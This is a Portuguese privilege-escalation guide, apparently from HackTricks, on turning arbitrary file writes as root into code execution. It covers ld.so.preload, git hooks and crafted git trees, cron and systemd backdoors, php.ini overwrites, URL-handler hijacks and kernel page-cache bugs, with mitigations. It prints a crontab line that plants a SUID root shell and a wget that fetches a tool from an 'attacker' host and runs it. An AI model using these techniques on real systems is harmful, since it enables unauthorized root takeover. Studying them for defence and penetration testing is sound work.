# Escrita Arbitrária de Arquivos como Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` é uma lista em todo o sistema de shared objects que o dynamic linker carrega antes de outros shared objects. O secure-execution mode aplica restrições adicionais ao preloading, portanto um caminho de biblioteca como `/tmp/pe.so` não é uma técnica SUID-binary universal.\
Se você puder criá-lo ou modificá-lo, um processo que carregar o arquivo carregará a biblioteca listada antes de seus outros shared objects, permitindo a execução de código no contexto desse processo.<sup>[[12]](#references)</sup>
...
**Git hooks** são scripts executáveis executados em eventos de um repositório, incluindo operações de commit e merge. Se um **script ou usuário privilegiado** realizar essas ações e um atacante puder **escrever na pasta `.git`**, o hook poderá ser usado para **privilege escalation**.<sup>[[13]](#references)</sup>

Por exemplo, é possível **gerar um script** em um git repo em **`.git/hooks`** para que ele seja sempre executado quando um novo commit for criado:
```bash
...
Um sincronizador privilegiado pode evitar um checkout e, em vez disso, enumerar um repositório influenciado pelo atacante com `git ls-tree`, ler cada blob com `git cat-file`, combinar o pathname reportado com um diretório de staging e gravá-lo por conta própria. Isso se torna uma **arbitrary file write com os privilégios do sincronizador** quando ele combina `-c safe.directory=*` (desabilitando a proteção do Git contra repositórios pertencentes a outro usuário) com a ausência de uma verificação de contenção do destino. Um nome absoluto de tree-entry faz com que `os.path.join(stage, name)` descarte `stage`; um nome relativo contendo `../` escapa quando o sistema de arquivos o resolve. Como a aplicação materializa a tree bruta em vez de pedir ao Git para fazer o checkout, a rejeição de pathnames durante o checkout nunca protege o sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Procure este padrão de código em serviços executados como root, timers, agentes de deployment, importadores de templates e tarefas de backup/restore:<sup>[[30]](#references)</sup>
```python
...
```
Uma entrada de tree é codificada como `<mode> SP <name> NUL <raw object ID>`. A opção `git hash-object --literally` permite deliberadamente dados de objeto que a análise normal ou o `git fsck` podem rejeitar; assim, um clone descartável pode construir uma tree cujo nome de arquivo é um destino absoluto. Este exemplo cria um blob de arquivo cron, envolve a tree criada em um commit e move uma branch para ele; a exploração ainda exige permissão para atualizar um repositório consumido pela tarefa privilegiada e um servidor Git que aceite o objeto malformado.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
...
- Substitua `safe.directory=*` pelos repositórios exatos nos quais o serviço deve confiar e, sempre que possível, processe os repositórios sem privilégios de root.
- Rejeite nomes absolutos e qualquer componente `.` ou `..` antes da materialização. Após a junção, faça a canonicalização e verifique se o destino continua dentro da root pretendida.
- Evite symlink races do tipo check-then-open: abra em relação a um descritor de diretório confiável e, no Linux, use `openat2()` com `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` para paths controlados pelo atacante.
- Prefira um checkout normal em um diretório isolado em vez de reimplementar o checkout a partir da saída do plumbing. Se a ingestão de raw objects for necessária, habilite a validação no lado do recebimento, como `receive.fsckObjects=true`; não reduza os findings relacionados a path de `receive.fsck.*` necessários para rejeitar trees criadas de forma maliciosa.

### Arquivos de Cron e tempo

Se você puder **escrever arquivos relacionados ao cron que são executados pelo root**, normalmente poderá obter code execution na próxima execução do job. Os alvos interessantes incluem:<sup>[[14]](#references)[[20]](#references)</sup>
...
- **Criar um backdoor em um target de timer existente** modificando o script ou o binário que ele executa

Exemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se você só puder escrever dentro de um diretório do cron usado por `run-parts`, coloque um arquivo executável nele:
```bash
...
- **Sobrescrever `ExecStart=`** em uma unidade de serviço pertencente ao root que você possa modificar
- **Adicionar um override drop-in** com um `ExecStart=` malicioso e limpar o antigo primeiro
...
```
Se você não puder reiniciar serviços por conta própria, mas puder editar uma unit ativada por socket, talvez só precise **aguardar uma conexão de cliente** para disparar a execução do serviço com backdoor como root.<sup>[[17]](#references)</sup>

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restritivo** (por exemplo, `disable_functions=exec,system,...`). Se o código no sandbox ainda tiver **qualquer primitiva de escrita** (como `file_put_contents`) e você conseguir alcançar o **caminho exato do `php.ini`** usado pelo daemon, poderá **sobrescrever essa configuração** para remover as restrições e então enviar um segundo payload que seja executado com privilégios elevados.<sup>[[2]](#references)</sup>
...
```
Se o daemon for executado como root (ou validar usando paths pertencentes ao root), a segunda execução fornecerá um contexto root. Isso é essencialmente **privilege escalation via config overwrite** quando o runtime em sandbox ainda consegue escrever arquivos.

### binfmt_misc

`binfmt_misc` expõe registrations em `/proc/sys/fs/binfmt_misc`; cada registration associa um padrão de tipo de arquivo a um interpreter. O impacto de privilégio depende de quem pode alterar a registration e de qual processo executará posteriormente o arquivo correspondente, portanto verifique esses requisitos antes de considerar isso um caminho de privilege escalation.<sup>[[21]](#references)</sup>

### Sobrescrever handlers de schema (como http: ou https:)

Desktop environments usam associações MIME e desktop entries para escolher uma aplicação para URI schemes; um atacante que consiga escrever a configuração relevante por usuário e os diretórios de desktop entries pode redirecionar esses schemes para um launcher sob seu controle. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os handlers de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), um clique do usuário pode invocar essa desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
...
Se um workflow privilegiado executar algo como `/bin/sh /home/username/.../script` (ou qualquer binary dentro de um diretório pertencente a um usuário não privilegiado), você pode sequestrá-lo:<sup>[[1]](#references)</sup>

- **Detecte a execução:** monitore os processos com pspy para identificar o root invocando paths controlados pelo usuário.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** certifique-se de que tanto o arquivo-alvo quanto o diretório pertençam ao seu usuário e possam ser gravados por ele.
- **Hijack the target:** faça backup do binário/script original e coloque um payload que crie um shell SUID (ou qualquer outra ação de root); em seguida, restaure as permissões:
```bash
...
### Modificação somente do arquivo page-cache de binários privilegiados

Alguns bugs do kernel não modificam o arquivo **no disco**. Em vez disso, permitem modificar somente a cópia no **page cache** de um arquivo legível. Se você conseguir atingir um binário **setuid** ou executado pelo **root**, a próxima execução poderá executar bytes controlados pelo atacante a partir da memória e escalar privilégios, mesmo que o hash do arquivo no disco permaneça inalterado.<sup>[[3]](#references)[[4]](#references)</sup>
...
- **O efeito é temporário**: a alteração desaparece após uma reinicialização ou a expulsão do cache

Essa primitive fica entre a **arbitrary file write** clássica e bugs mais antigos de **page-cache abuse**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependia de uma race
- Dirty Pipe tinha limitações na posição de escrita
...
3. Acione a execução **antes** que a página seja expulsa do cache
...
- `splice()` pode mover referências a páginas do page cache de um arquivo legível para o scatterlist de TX da crypto
...
- quando essa região ainda referenciava páginas file-backed obtidas via splice, a escrita caía no **page cache do arquivo alvo**
...
O PoC público usava **escritas repetidas de 4 bytes** para modificar `/usr/bin/su` na memória e então executá-lo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Path de exemplo com ESP / XFRM + clone TEE do netfilter

DirtyClone (CVE-2026-43503) mostra outra variante do mesmo padrão de **page-cache-only write-to-root**, mas desta vez o sink é o **decrypt do IPsec ESP**, em vez do `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
...
- a mitigação original do DirtyFrag marcava esse skb com `SKBFL_SHARED_FRAG` para que `esp_input()` **copiasse antes de fazer o decrypt**
...
Assim, a lição para o reviewer é mais ampla que o CVE: se uma mitigação depende de **metadata de skb/página** para decidir se uma operação precisa copiar primeiro, qualquer **path de clone/cópia que preserve a página subjacente, mas remova os metadados**, pode reabrir silenciosamente a primitive de escrita.
...
4. codificar cada palavra de 4 bytes alvo no campo `seq_hi` da SA (o word-selection trick do DirtyFrag)
5. enviar o pacote ESP-in-UDP obtido via splice para que o **clone TEE** chegue a `esp_input()` e faça o decrypt **in-place**
...
Verificações de exposição úteis para essa variante:
```bash
...
```
A redução da superfície de ataque a curto prazo também é específica do caminho neste caso: atualizar para um kernel que contenha `48f6a5356a33` corrige o caminho de clone, enquanto bloquear o autoload de `xt_TEE` remove a **etapa de lavagem de flags** e bloquear `esp4` / `esp6` remove o **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
...
```
Os valores de configuração abaixo distinguem uma interface carregável de uma incorporada ao kernel; as regras de compilação de crypto associam `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>
...
```
Vale a pena lembrar esse tipo de mitigation para outros kernel LPEs também: se o exploit depender de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode interromper o caminho do exploit mesmo antes que uma atualização completa do kernel esteja disponível.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking de um script executado como root em um diretório do PaperCut com permissão de escrita pelo usuário](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
...
- [11] [Mitigation anterior do Linux: definir `SKBFL_SHARED_FRAG` para pacotes UDP submetidos a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
...
- [34] [`openat2(2)` — página de manual do Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
